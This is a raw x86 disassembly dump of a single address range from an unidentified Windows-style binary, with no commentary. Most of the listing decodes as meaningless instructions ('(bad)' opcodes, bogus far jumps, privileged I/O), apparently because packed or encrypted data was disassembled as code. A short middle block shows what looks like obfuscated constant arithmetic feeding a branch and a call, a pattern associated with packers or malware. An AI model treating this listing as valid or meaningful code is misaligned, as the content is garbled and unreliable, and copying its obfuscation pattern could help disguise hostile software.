  40bb49:	sbb    al,0x9d
  40bb4b:	sbb    ebp,edi
  40bb4d:	mov    gs,WORD PTR [ecx+0x63]
  40bb50:	add    al,0xdb
  40bb52:	xchg   DWORD PTR [edx+0x1a],esp
  40bb55:	xchg   DWORD PTR [eax+0x45],esp
  40bb58:	mov    cl,0xa5
  40bb5a:	sar    BYTE PTR [ebp-0x114e7dda],0x56
  40bb61:	xor    ebp,0x585c0dad
  40bb67:	sbb    BYTE PTR [eax+0x62],0x4f
  40bb6b:	repz std 
  40bb6d:	push   es
  40bb6e:	cs (bad) 
  40bb70:	xor    dh,bh
  40bb72:	mov    ebx,0x2ddcdeb7
  40bb77:	xchg   BYTE PTR ds:0x439ff8fd,dh
  40bb7d:	mov    ah,0x88
  40bb7f:	stos   DWORD PTR es:[edi],eax
  40bb80:	repz cmc 
  40bb82:	leave  
  40bb83:	xor    esp,DWORD PTR [edx+0x69]
  40bb86:	ds loope 0x40bbd7
  40bb89:	cwde   
  40bb8a:	loopne 0x40bbfb
  40bb8c:	jmp    0xa1f6:0x50483174
  40bb93:	sub    eax,0xb047e65b
  40bb98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb99:	jl     0x40bb9a
  40bb9b:	xor    BYTE PTR [ebp+edi*1+0x29],ah
  40bb9f:	aaa    
  40bba0:	test   ah,cl
  40bba2:	mov    edi,DWORD PTR [ecx-0x7abb9a71]
  40bba8:	add    dh,bh
  40bbaa:	(bad)  
  40bbab:	cli    
  40bbac:	jae    0x40bb52
  40bbae:	cld    
  40bbaf:	scas   eax,DWORD PTR es:[edi]
  40bbb0:	(bad)  
  40bbb1:	outs   dx,DWORD PTR ds:[esi]
  40bbb2:	test   DWORD PTR [esi+0x6d],esp
  40bbb5:	or     dh,BYTE PTR [eax]
  40bbb7:	loopne 0x40bbbe
  40bbb9:	icebp  
  40bbba:	out    0x49,eax
  40bbbc:	clc    
  40bbbd:	loop   0x40bc27
  40bbbf:	loop   0x40bb4f
  40bbc1:	dec    edx
  40bbc2:	add    al,BYTE PTR [edi+0x5d554a45]
  40bbc8:	ret    
  40bbc9:	cmp    BYTE PTR [edi],bh
  40bbcb:	cmp    edi,DWORD PTR [ecx-0x30871f32]
  40bbd1:	push   ss
  40bbd2:	scas   al,BYTE PTR es:[edi]
  40bbd3:	icebp  
  40bbd4:	jecxz  0x40bc4a
  40bbd6:	fidivr DWORD PTR [edi+0x75e46d9d]
  40bbdc:	sub    eax,esi
  40bbde:	je     0x40bb92
  40bbe0:	add    ebx,DWORD PTR [ebx]
  40bbe2:	sbb    al,0xd0
  40bbe4:	sub    esp,edi
  40bbe6:	adc    al,0xa7
  40bbe8:	mov    ebp,0x3af2ceba
  40bbed:	jmp    0xe8ea24e8
  40bbf2:	and    esi,DWORD PTR es:0x70bbd890
  40bbf9:	jmp    0xb1e0:0x37726bd8
  40bc00:	dec    edx
  40bc01:	cld    
  40bc02:	and    al,0x43
  40bc04:	stos   BYTE PTR es:[edi],al
  40bc05:	mov    ebp,0x3dd17a9d
  40bc0a:	or     al,0xc5
  40bc0c:	cs dec ebx
  40bc0e:	push   edx
  40bc0f:	cdq    
  40bc10:	outs   dx,DWORD PTR ds:[esi]
  40bc11:	pushf  
  40bc12:	pop    ecx
  40bc13:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40bc15:	xor    eax,0xa24362a9
  40bc1a:	xchg   edx,eax
  40bc1b:	adc    eax,0xfe96fc42
  40bc20:	cmp    eax,0x4ed94fbe
  40bc25:	or     BYTE PTR [ecx+0x31474459],bl
  40bc2b:	js     0x40bc77
  40bc2d:	fs inc ecx
  40bc2f:	add    ecx,DWORD PTR [ebx-0x80]
  40bc32:	sbb    dl,BYTE PTR [eax]
  40bc34:	sti    
  40bc35:	out    0x7,eax
  40bc37:	push   eax
  40bc38:	rcl    DWORD PTR [ebp-0x31e09520],1
  40bc3e:	inc    ecx
  40bc3f:	call   0x996a:0xb1eb2c96
  40bc46:	idiv   DWORD PTR [edi-0x170df290]
  40bc4c:	lahf   
  40bc4d:	fstp   TBYTE PTR [esi-0x1aaffa7d]
  40bc53:	mov    al,ds:0xf1a53492
  40bc58:	nop
  40bc59:	sbb    DWORD PTR [eax+0x4ed3465d],ebx
  40bc5f:	int3   
  40bc60:	cmp    BYTE PTR [edx+0x74],0xa9
  40bc64:	ss loopne 0x40bc76
  40bc67:	sbb    eax,DWORD PTR [ecx-0x4d13cb9e]
  40bc6d:	imul   eax,ebp,0x194be7d3
  40bc73:	and    al,0x3e
  40bc75:	push   esi
  40bc76:	hlt    
  40bc77:	cmp    eax,0x83c71690
  40bc7c:	jns    0x40bcdc
  40bc7e:	pushf  
  40bc7f:	icebp  
  40bc80:	hlt    
  40bc81:	pop    ebp
  40bc82:	loop   0x40bc33
  40bc84:	jns    0x40bc38
  40bc86:	cmp    BYTE PTR [ecx],0x39
  40bc89:	xor    DWORD PTR [eax+0x1b],ebp
  40bc8c:	iret   
  40bc8d:	xchg   edi,eax
  40bc8e:	xchg   edi,eax
  40bc8f:	xchg   ebp,eax
  40bc90:	push   edi
  40bc91:	cmp    eax,0x81055530
  40bc96:	cmp    eax,0xb0bf4c9b
  40bc9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc9c:	iret   
  40bc9d:	xchg   DWORD PTR [ebp-0x34],esi
  40bca0:	jbe    0x40bd0f
  40bca2:	cmp    BYTE PTR [eax-0x70],dl
  40bca5:	or     BYTE PTR [ebp-0x13],dl
  40bca8:	dec    eax
  40bca9:	adc    DWORD PTR [eax-0x71],esp
  40bcac:	push   ebx
  40bcad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcae:	push   eax
  40bcaf:	aaa    
  40bcb0:	jle    0x40bce9
  40bcb2:	popf   
  40bcb3:	xchg   esp,eax
  40bcb4:	(bad)  
  40bcb5:	push   0x4e512b39
  40bcba:	test   DWORD PTR [edi-0x71be73d7],esi
  40bcc0:	leave  
  40bcc1:	test   BYTE PTR [edx+0x38fa6ae4],cl
  40bcc7:	rcr    DWORD PTR [ebx+0x22e74dfb],0x9
  40bcce:	sar    BYTE PTR [eax],1
  40bcd0:	mov    edi,0x4069e4c8
  40bcd5:	ins    DWORD PTR es:[edi],dx
  40bcd6:	fstp   TBYTE PTR [ecx]
  40bcd8:	cdq    
  40bcd9:	add    bl,ah
  40bcdb:	stos   BYTE PTR es:[edi],al
  40bcdc:	xchg   ebx,eax
  40bcdd:	gs das 
  40bcdf:	les    ecx,FWORD PTR [edx]
  40bce1:	int    0x4
  40bce3:	add    DWORD PTR [ebx+0x18536f26],ebx
  40bce9:	dec    edi
  40bcea:	add    al,0x93
  40bcec:	jb     0x40bcf6
  40bcee:	into   
  40bcef:	mov    esi,0x3e48c7cd
  40bcf4:	inc    ebp
  40bcf5:	pushf  
  40bcf6:	cmp    dh,al
  40bcf8:	test   eax,0xda20effa
  40bcfd:	and    al,0xa2
  40bcff:	gs push ds
  40bd01:	das    
  40bd02:	in     eax,0x84
  40bd04:	fcmovne st,st(0)
  40bd06:	xchg   ebp,eax
  40bd07:	pop    esi
  40bd08:	mov    ch,0x50
  40bd0a:	push   edi
  40bd0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd0c:	sbb    dh,BYTE PTR [edi+0x557d4eb4]
  40bd12:	and    ebx,edx
  40bd14:	xor    al,0xfa
  40bd16:	test   BYTE PTR [ecx],0xcd
  40bd19:	add    al,0x35
  40bd1b:	inc    esp
  40bd1c:	cdq    
  40bd1d:	outs   dx,DWORD PTR ds:[esi]
  40bd1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd1f:	jp     0x40bcae
  40bd21:	or     eax,0x5413611
  40bd26:	nop
  40bd27:	push   0x7eb53bca
  40bd2c:	xchg   esi,eax
  40bd2d:	js     0x40bdad
  40bd2f:	mov    ebx,0x3b6b4943
  40bd34:	es and bl,0xad
  40bd38:	fsub   st(5),st
  40bd3a:	(bad)  
  40bd3b:	ret    
  40bd3c:	jne    0x40bd09
  40bd3e:	stc    
  40bd3f:	xchg   ebp,eax
  40bd40:	std    
  40bd41:	repnz test al,0xb6
  40bd44:	cmp    al,0x1b
  40bd46:	xchg   esp,eax
  40bd47:	push   eax
  40bd48:	int    0xac
  40bd4a:	sbb    eax,0xc67c2f3a
  40bd4f:	mov    esi,0x44147329
  40bd54:	test   BYTE PTR [esi+0xa],ah
  40bd57:	cmp    BYTE PTR [edx-0x2c464b4a],bh
  40bd5d:	clc    
  40bd5e:	mov    eax,ds:0xa83a68b9
  40bd63:	mov    ds:0xd1247ab2,eax
  40bd68:	out    0xab,eax
  40bd6a:	or     BYTE PTR [esi],cl
  40bd6c:	fldenv [edi]
  40bd6e:	fcomp  DWORD PTR [ecx]
  40bd70:	mov    ebp,0x457736eb
  40bd75:	enter  0x1b6b,0x33
  40bd79:	push   esp
  40bd7a:	jp     0x40bdca
  40bd7c:	xchg   esp,eax
  40bd7d:	jmp    0x9f90:0x83bd1848
  40bd84:	adc    BYTE PTR [esi],bh
  40bd86:	pop    edi
  40bd87:	stos   DWORD PTR es:[edi],eax
  40bd88:	lods   al,BYTE PTR ds:[esi]
  40bd89:	push   edx
  40bd8a:	iret   
  40bd8b:	mov    ds:0x53cf43c9,eax
  40bd90:	cmp    esp,ecx
  40bd92:	sub    al,0x3
  40bd94:	adc    al,0xc9
  40bd96:	jmp    0xbe64:0xdf446c2d
  40bd9d:	cli    
  40bd9e:	in     eax,dx
  40bd9f:	xchg   edx,eax
  40bda0:	and    al,0x37
  40bda2:	cmp    esp,edi
  40bda4:	(bad)  
  40bda5:	into   
  40bda6:	ins    DWORD PTR es:[edi],dx
  40bda7:	and    eax,0xe4ea38f0
  40bdac:	add    eax,0xf5fd4826
  40bdb1:	inc    edi
  40bdb2:	sbb    ecx,esp
  40bdb4:	mov    esp,0x28f676c
  40bdb9:	xchg   esp,eax
  40bdba:	and    BYTE PTR [ebx-0x44],cl
  40bdbd:	xlat   BYTE PTR ds:[ebx]
  40bdbe:	lods   eax,DWORD PTR ds:[esi]
  40bdbf:	inc    ecx
  40bdc0:	icebp  
  40bdc1:	add    DWORD PTR ds:0xad547bf,ecx
  40bdc7:	ret    0xced7
  40bdca:	dec    eax
  40bdcb:	pop    esp
  40bdcc:	jo     0x40bdd1
  40bdce:	push   ecx
  40bdcf:	inc    esp
  40bdd0:	jnp    0x40bdc9
  40bdd2:	lea    ebp,[ebp-0x6106611]
  40bdd8:	fwait
  40bdd9:	inc    edi
  40bdda:	mov    ebp,0xd24603b6
  40bddf:	xlat   BYTE PTR es:[ebx]
  40bde1:	enter  0xa5b5,0xc7
  40bde5:	outs   dx,DWORD PTR ds:[esi]
  40bde6:	mov    edi,0x1d61d5b6
  40bdeb:	in     al,0xff
  40bded:	and    ebp,ebp
  40bdef:	into   
  40bdf0:	inc    edx
  40bdf1:	or     dh,cl
  40bdf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdf4:	add    DWORD PTR [edi],0x1f7211d1
  40bdfa:	aad    0xab
  40bdfc:	push   ss
  40bdfd:	and    al,0x80
  40bdff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be00:	xor    esi,DWORD PTR [ecx]
  40be02:	and    BYTE PTR [eax+0x37],cl
  40be05:	out    0x7a,al
  40be07:	or     eax,0x1cb7c757
  40be0c:	out    dx,al
  40be0d:	sbb    ecx,ecx
  40be0f:	retf   
  40be10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be11:	arpl   WORD PTR [edx*2+0xe07bb26],sp
  40be18:	cld    
  40be19:	retf   0x6f21
  40be1c:	xchg   edi,eax
  40be1d:	icebp  
  40be1e:	popa   
  40be1f:	pop    ds
  40be20:	mov    ds:0xf67b7998,al
  40be25:	adc    ah,BYTE PTR [edi]
  40be27:	aaa    
  40be28:	xchg   edx,eax
  40be29:	mov    bh,0x1a
  40be2b:	stc    
  40be2c:	and    bh,BYTE PTR [esi+ebp*8]
  40be2f:	cmp    DWORD PTR [edi],edi
  40be31:	sbb    cl,BYTE PTR [ebx-0x2c]
  40be34:	out    dx,eax
  40be35:	and    DWORD PTR [edi-0x6b],0x14
  40be39:	sub    BYTE PTR [eax],dh
  40be3b:	fistp  DWORD PTR [edi+0x17]
  40be3e:	daa    
  40be3f:	out    0x7f,al
  40be41:	aaa    
  40be42:	sti    
  40be43:	pop    edx
  40be44:	mov    ah,0xdb
  40be46:	clc    
  40be47:	int3   
  40be48:	dec    edi
  40be49:	pusha  
  40be4a:	nop
  40be4b:	aaa    
  40be4c:	ins    BYTE PTR es:[edi],dx
  40be4d:	and    DWORD PTR [ecx-0x6],esi
  40be50:	mov    al,0xc3
  40be52:	out    dx,eax
  40be53:	mov    al,BYTE PTR [esi-0x433b3e36]
  40be59:	jle    0x40bdea
  40be5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be5c:	adc    ch,cl
  40be5e:	jno    0x40be08
  40be60:	imul   esp,DWORD PTR [ebx+0x291d066a],0x8b7a7166
  40be6a:	shl    bh,0x13
  40be6d:	xor    eax,0x617f2b63
  40be72:	ror    bh,0x76
  40be75:	push   ebx
  40be76:	sbb    BYTE PTR [ebx+0x1fe519b4],ah
  40be7c:	pushf  
  40be7d:	jo     0x40be36
  40be7f:	jae    0x40beb6
  40be81:	int    0x5
  40be83:	mov    dl,0x1a
  40be85:	jne    0x40beaa
  40be87:	mov    esi,0xc7f44d89
  40be8c:	inc    ebp
  40be8d:	loopne 0x40bedf
  40be8f:	dec    edx
  40be90:	add    BYTE PTR [eax],al
  40be92:	mov    DWORD PTR [ebp-0x1c],0x2079
  40be99:	mov    DWORD PTR [ebp-0x28],0x792e
  40bea0:	mov    DWORD PTR [ebp-0x24],0x10e8
  40bea7:	mov    DWORD PTR [ebp-0x30],0x22b3
  40beae:	mov    DWORD PTR [ebp-0x2c],0x2293
  40beb5:	mov    eax,DWORD PTR [ebp-0x30]
  40beb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bebb:	mov    edx,DWORD PTR [ebp-0x28]
  40bebe:	mov    esi,DWORD PTR [ebp-0x24]
  40bec1:	add    eax,edx
  40bec3:	mov    edx,DWORD PTR [ebp-0x20]
  40bec6:	adc    ecx,esi
  40bec8:	mov    esi,DWORD PTR [ebp-0x1c]
  40becb:	add    eax,0x3e60
  40bed0:	adc    ecx,0xd49e
  40bed6:	xor    eax,0x14ce
  40bedb:	xor    ecx,0x354f
  40bee1:	add    eax,edx
  40bee3:	mov    edx,DWORD PTR [ebp-0x10]
  40bee6:	adc    ecx,esi
  40bee8:	mov    esi,DWORD PTR [ebp-0xc]
  40beeb:	cmp    edx,eax
  40beed:	jne    0x40befb
  40bef3:	cmp    esi,ecx
  40bef5:	je     0x40cc06
  40befb:	mov    DWORD PTR [ebp-0x28],0x4db
  40bf02:	mov    DWORD PTR [ebp-0x24],0x233b
  40bf09:	mov    DWORD PTR [ebp-0x30],0x2c94
  40bf10:	push   0x6b33
  40bf15:	mov    DWORD PTR [ebp-0x2c],0x647f
  40bf1c:	mov    eax,DWORD PTR [ebp-0x30]
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bf22:	push   0x7c8f
  40bf27:	push   ecx
  40bf28:	push   eax
  40bf29:	call   0x416c20
  40bf2e:	mov    ecx,DWORD PTR [ebp-0x28]
  40bf31:	mov    esi,DWORD PTR [ebp-0x24]
  40bf34:	push   0x4e1a18a
  40bf39:	push   0x283cdcc
  40bf3e:	and    edx,esi
  40bf40:	and    eax,ecx
  40bf42:	push   edx
  40bf43:	jmp    0x40c339
  40bf48:	fst    DWORD PTR [ebp-0x17]
  40bf4b:	or     eax,0x4c9c1c65
  40bf50:	push   ds
  40bf51:	jp     0x40bede
  40bf53:	jo     0x40bf4d
  40bf55:	and    DWORD PTR [ecx+0x1805b6bc],ebx
  40bf5b:	sbb    BYTE PTR [esi+0x12],ch
  40bf5e:	sbb    BYTE PTR [eax],bl
  40bf60:	inc    eax
  40bf61:	cmp    eax,0x6df4df0a
  40bf66:	jl     0x40bfe4
  40bf68:	mov    al,0xfe
  40bf6a:	pop    eax
  40bf6b:	add    al,0xcb
  40bf6d:	push   edx
  40bf6e:	dec    ebx
  40bf6f:	ret    
  40bf70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf71:	ins    DWORD PTR es:[edi],dx
  40bf72:	fidiv  DWORD PTR ds:0xc7c6507e
  40bf78:	ins    BYTE PTR es:[edi],dx
  40bf79:	pop    es
  40bf7a:	addr16 test al,0xad
  40bf7d:	cwde   
  40bf7e:	popf   
  40bf7f:	sub    esp,DWORD PTR [esi-0x5]
  40bf82:	call   0x4fb0d3b9
  40bf87:	cmp    esp,DWORD PTR [edi]
  40bf89:	xchg   ecx,eax
  40bf8a:	je     0x40bf9f
  40bf8c:	inc    ebx
  40bf8d:	push   es
  40bf8e:	retf   
  40bf8f:	bound  edi,QWORD PTR [ebx+0x40]
  40bf92:	adc    BYTE PTR [edx-0xa],ch
  40bf95:	fidivr WORD PTR [ecx+0x291133a5]
  40bf9b:	test   eax,0xd972320b
  40bfa0:	nop
  40bfa1:	lods   eax,DWORD PTR ds:[esi]
  40bfa2:	or     al,0x27
  40bfa4:	cmp    al,0x14
  40bfa6:	inc    edi
  40bfa7:	inc    esi
  40bfa8:	mov    eax,eax
  40bfaa:	cwde   
  40bfab:	xlat   BYTE PTR ds:[ebx]
  40bfac:	test   eax,0x59e30063
  40bfb1:	xor    ecx,DWORD PTR [ebp+0x77]
  40bfb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfb5:	sbb    bl,cl
  40bfb7:	add    eax,0x14bee042
  40bfbc:	sub    eax,0x20667ab
  40bfc1:	add    BYTE PTR [edi+0x29da38a2],dl
  40bfc7:	sub    eax,0x482af6bf
  40bfcc:	cmp    eax,0x37cbc095
  40bfd1:	jbe    0x40c029
  40bfd3:	push   ecx
  40bfd4:	mov    edx,0xc89e9249
  40bfd9:	ffree  st(2)
  40bfdb:	add    ebx,ebp
  40bfdd:	xchg   edi,eax
  40bfde:	xchg   esi,eax
  40bfdf:	test   BYTE PTR [edx-0x60],0x8
  40bfe3:	mov    dl,0xbf
  40bfe5:	out    0xde,eax
  40bfe7:	cdq    
  40bfe8:	lahf   
  40bfe9:	out    0x9,eax
  40bfeb:	in     al,dx
  40bfec:	gs sub al,0x8b
  40bfef:	popf   
  40bff0:	adc    DWORD PTR [edi-0x6cc9413],esi
  40bff6:	add    BYTE PTR [ebx-0xe5b0d2a],ch
  40bffc:	pop    esp
  40bffd:	mov    ds:0xec710fa8,eax
  40c002:	popa   
  40c003:	and    BYTE PTR [eax],bl
  40c005:	out    0x83,eax
  40c007:	inc    ecx
  40c008:	mov    al,0x37
  40c00a:	scas   al,BYTE PTR es:[edi]
  40c00b:	xchg   ecx,eax
  40c00c:	ret    
  40c00d:	mov    esi,0xcfad65f4
  40c012:	pop    edx
  40c013:	rcl    DWORD PTR [edi+0x37],1
  40c016:	or     BYTE PTR ds:0x67ff89a4,cl
  40c01c:	lea    ebx,[eax-0xfb387f5]
  40c022:	jb     0x40bfea
  40c024:	pop    es
  40c025:	and    eax,0xf4506585
  40c02a:	and    al,0x8c
  40c02c:	adc    eax,0x9cca76f8
  40c031:	lahf   
  40c032:	xlat   BYTE PTR ds:[ebx]
  40c033:	aas    
  40c034:	je     0x40bfba
  40c036:	aas    
  40c037:	jecxz  0x40bfbb
  40c039:	xchg   BYTE PTR [esi],al
  40c03b:	mov    bh,0x94
  40c03d:	cmp    al,0x23
  40c03f:	add    al,0xed
  40c041:	mov    esi,0x38ce126b
  40c046:	push   eax
  40c047:	rep ins DWORD PTR es:[edi],dx
  40c049:	lds    ecx,FWORD PTR ds:0xdd7e85c
  40c04f:	and    esp,ecx
  40c051:	fcomp  st(5)
  40c053:	out    dx,al
  40c054:	out    0x24,eax
  40c056:	xor    edi,ebx
  40c058:	xchg   ecx,eax
  40c059:	cmp    BYTE PTR [edi+0x38177650],al
  40c05f:	pop    ds
  40c060:	push   0xb059a3d1
  40c065:	pop    edi
  40c066:	mov    bl,dh
  40c068:	in     eax,dx
  40c069:	pop    ecx
  40c06a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c06b:	inc    eax
  40c06c:	sti    
  40c06d:	imul   ecx,DWORD PTR [edx+edx*4],0x13
  40c071:	jbe    0x40c011
  40c073:	aas    
  40c074:	ds pushf 
  40c076:	jno    0x40c01c
  40c078:	sbb    al,BYTE PTR [edi]
  40c07a:	or     DWORD PTR [eax-0x74b475d5],edx
  40c080:	xor    BYTE PTR [edi-0x36],0xaf
  40c084:	scas   eax,DWORD PTR es:[edi]
  40c085:	cwde   
  40c086:	or     DWORD PTR [ebp+0x30],edx
  40c089:	mov    esi,0x88c1159d
  40c08e:	sub    DWORD PTR [ebp-0x67],edx
  40c091:	add    ebx,DWORD PTR [eax]
  40c093:	add    edx,DWORD PTR [ebx]
  40c095:	mov    ecx,0x14faee82
  40c09a:	fisubr DWORD PTR [ecx]
  40c09c:	into   
  40c09d:	xchg   ebp,eax
  40c09e:	mov    WORD PTR [eax+edi*4-0x6d],?
  40c0a2:	jnp    0x40c113
  40c0a4:	stos   BYTE PTR es:[edi],al
  40c0a5:	add    DWORD PTR [eax+0x42076cc6],edi
  40c0ab:	js     0x40c031
  40c0ad:	shl    DWORD PTR [ecx],1
  40c0af:	stos   BYTE PTR es:[edi],al
  40c0b0:	cmp    dh,bh
  40c0b2:	(bad)  
  40c0b3:	std    
  40c0b4:	jl     0x40c11c
  40c0b6:	sbb    BYTE PTR [eax-0x1c74737],al
  40c0bc:	hlt    
  40c0bd:	cdq    
  40c0be:	mov    ch,0x4e
  40c0c0:	stos   DWORD PTR es:[edi],eax
  40c0c1:	mov    DWORD PTR [ebx+0x3b8bd975],esp
  40c0c7:	cmc    
  40c0c8:	lea    edi,[ebx-0x80]
  40c0cb:	sub    BYTE PTR [ebx],0x18
  40c0ce:	test   BYTE PTR [esi-0x2f],cl
  40c0d1:	inc    edi
  40c0d2:	je     0x40c11d
  40c0d4:	dec    ebx
  40c0d5:	test   DWORD PTR [ecx],ebx
  40c0d7:	shr    ah,1
  40c0d9:	je     0x40c0d5
  40c0db:	cmp    BYTE PTR ds:0xc4039892,bh
  40c0e1:	and    al,0xb4
  40c0e3:	and    eax,DWORD PTR [ecx*2+0x141bd85a]
  40c0ea:	pop    edi
  40c0eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0ec:	push   ds
  40c0ed:	sar    BYTE PTR [ecx-0x2c2bf66a],0x28
  40c0f4:	inc    edi
  40c0f5:	adc    DWORD PTR [edi+0x44e5ce2b],ecx
  40c0fb:	add    al,0x87
  40c0fd:	mov    esi,0x48b96b2b
  40c102:	xchg   ebx,eax
  40c103:	rcl    DWORD PTR [esi-0x59943e18],1
  40c109:	mov    ecx,0xf915d463
  40c10e:	mov    ecx,0x68c0ebf1
  40c113:	idiv   DWORD PTR [ebp-0x7aa63df1]
  40c119:	pop    edx
  40c11a:	mov    cl,cl
  40c11c:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40c11e:	add    bl,ch
  40c120:	enter  0xdc72,0xe2
  40c124:	sub    eax,0xa410cf51
  40c129:	cmp    ch,BYTE PTR [edi+0x574ae5b7]
  40c12f:	fs fwait
  40c131:	xor    bl,cl
  40c133:	das    
  40c134:	cmp    eax,0x61c7ee06
  40c139:	scas   eax,DWORD PTR es:[edi]
  40c13a:	mov    edx,0x686edbad
  40c13f:	sbb    DWORD PTR [ecx+0x75],edi
  40c142:	in     eax,0xec
  40c144:	(bad)  
  40c146:	in     eax,0xf6
  40c148:	icebp  
  40c149:	push   0xffffffdd
  40c14b:	fst    DWORD PTR [ebx+eiz*2+0x198d60a1]
  40c152:	arpl   bx,ax
  40c154:	std    
  40c155:	sub    ah,BYTE PTR [ebx]
  40c157:	stos   BYTE PTR es:[edi],al
  40c158:	neg    ecx
  40c15a:	daa    
  40c15b:	popf   
  40c15c:	int    0x12
  40c15e:	push   ecx
  40c15f:	jmp    0xc766:0xfe43ef53
  40c166:	dec    edx
  40c167:	fisttp DWORD PTR [bx+si+0x64]
  40c16c:	cli    
  40c16d:	retf   
  40c16e:	mov    esp,0x4ca1b3d2
  40c173:	cmp    al,0xfd
  40c175:	adc    eax,0xb4a7f022
  40c17a:	cli    
  40c17b:	(bad)  
  40c17c:	mov    ch,0xed
  40c17e:	dec    esi
  40c17f:	adc    edi,edx
  40c181:	fnstsw WORD PTR es:[ebx-0xf14cd76]
  40c188:	jp     0x40c177
  40c18a:	scas   eax,DWORD PTR es:[edi]
  40c18b:	jne    0x40c15a
  40c18d:	repz into 
  40c18f:	adc    DWORD PTR [esi+ebx*4-0x4c51d55f],ebp
  40c196:	or     ch,ah
  40c198:	sub    al,0xa
  40c19a:	retf   0x5aab
  40c19d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c19e:	push   es
  40c19f:	cli    
  40c1a0:	inc    esi
  40c1a1:	push   ecx
  40c1a2:	stos   DWORD PTR es:[edi],eax
  40c1a3:	out    0xd4,al
  40c1a5:	fst    QWORD PTR [edx-0x3dd291bd]
  40c1ab:	icebp  
  40c1ac:	scas   al,BYTE PTR es:[edi]
  40c1ad:	jl     0x40c167
  40c1af:	sub    ch,ch
  40c1b1:	cmp    BYTE PTR [ebp-0x3e62aee5],ah
  40c1b7:	adc    bl,BYTE PTR [ebx]
  40c1b9:	adc    eax,0x567f0b48
  40c1be:	and    BYTE PTR [eax-0x33],0x93
  40c1c2:	xor    al,cl
  40c1c4:	rcr    BYTE PTR [edx+0x2a],cl
  40c1c7:	pushf  
  40c1c8:	add    al,0xc3
  40c1ca:	inc    esp
  40c1cb:	sbb    eax,0x3f2ead4
  40c1d0:	movnti DWORD PTR [ecx-0x5101a74],edx
  40c1d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1d8:	adc    ecx,ebp
  40c1da:	pop    ds
  40c1db:	xor    DWORD PTR [ebx-0x6c],ecx
  40c1de:	ret    
  40c1df:	ss add al,0xb4
  40c1e2:	mov    ch,0x77
  40c1e4:	pop    es
  40c1e5:	inc    ebp
  40c1e6:	pop    ss
  40c1e7:	add    al,0xd5
  40c1e9:	jl     0x40c1f4
  40c1eb:	push   cs
  40c1ec:	cmp    esi,DWORD PTR [eax-0x67641d9c]
  40c1f2:	popf   
  40c1f3:	int3   
  40c1f4:	std    
  40c1f5:	aaa    
  40c1f6:	enter  0xbe39,0x25
  40c1fa:	in     eax,0x91
  40c1fc:	add    eax,0xc5fbdba9
  40c201:	lods   eax,DWORD PTR ds:[esi]
  40c202:	mov    BYTE PTR [edx-0x38],cl
  40c205:	jb     0x40c244
  40c207:	stc    
  40c208:	outs   dx,BYTE PTR ds:[esi]
  40c209:	in     al,0xed
  40c20b:	cli    
  40c20c:	aad    0x41
  40c20e:	ins    DWORD PTR es:[edi],dx
  40c20f:	cmp    eax,0x7c6849c7
  40c214:	neg    ch
  40c216:	dec    edx
  40c217:	cmp    dh,cl
  40c219:	xchg   ebx,eax
  40c21a:	push   ebx
  40c21b:	xchg   esi,eax
  40c21c:	dec    edx
  40c21d:	rcr    al,1
  40c21f:	jle    0x40c259
  40c221:	push   ebx
  40c222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c223:	(bad)  
  40c224:	jmp    0x9a31:0x929d6c15
  40c22b:	cmp    eax,0x5fe20056
  40c230:	mov    ds:0x1e6acddc,al
  40c235:	sbb    al,0x5d
  40c237:	xor    eax,DWORD PTR [ebx+0x3e]
  40c23a:	daa    
  40c23b:	mov    eax,0x2747cc94
  40c240:	adc    al,0xb7
  40c242:	push   ebx
  40c243:	add    eax,0xe6220a74
  40c248:	fmul   DWORD PTR [edx]
  40c24a:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c24c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c24d:	rcr    DWORD PTR [edi-0x26],1
  40c250:	ror    DWORD PTR [ebp+0x78],cl
  40c253:	or     BYTE PTR [edx-0x30],bl
  40c256:	pop    ecx
  40c257:	adc    esp,edx
  40c259:	iret   
  40c25a:	call   0x4523cf5f
  40c25f:	retf   
  40c260:	and    ebp,DWORD PTR ds:0xf2b7e23c
  40c266:	mov    al,0xad
  40c268:	sub    DWORD PTR [ebx-0x63],ecx
  40c26b:	xor    DWORD PTR [edi+eiz*2+0xfcc2cae],ecx
  40c272:	push   esi
  40c273:	data16 and BYTE PTR [edi+eax*2],dl
  40c277:	aam    0x4
  40c279:	loope  0x40c218
  40c27b:	cli    
  40c27c:	fwait
  40c27d:	xchg   BYTE PTR [ecx],al
  40c27f:	gs mov al,0x41
  40c282:	and    ecx,eax
  40c284:	pop    edx
  40c285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c286:	mov    edx,0x7a98fa8d
  40c28b:	sub    BYTE PTR [ecx-0x1d6b72fa],0xa2
  40c292:	mov    dh,0xd4
  40c294:	dec    edx
  40c295:	and    cl,0xbd
  40c298:	daa    
  40c299:	(bad)  
  40c29a:	aam    0x92
  40c29c:	sub    eax,0x6b05736
  40c2a1:	aaa    
  40c2a2:	(bad)  [edx-0x2ca941ee]
  40c2a8:	dec    ecx
  40c2a9:	inc    ebx
  40c2aa:	cwde   
  40c2ab:	mov    ds:0xf6bdca13,al
  40c2b0:	sbb    eax,0x4d046980
  40c2b5:	add    ebx,esp
  40c2b7:	xlat   BYTE PTR ds:[ebx]
  40c2b8:	ja     0x40c265
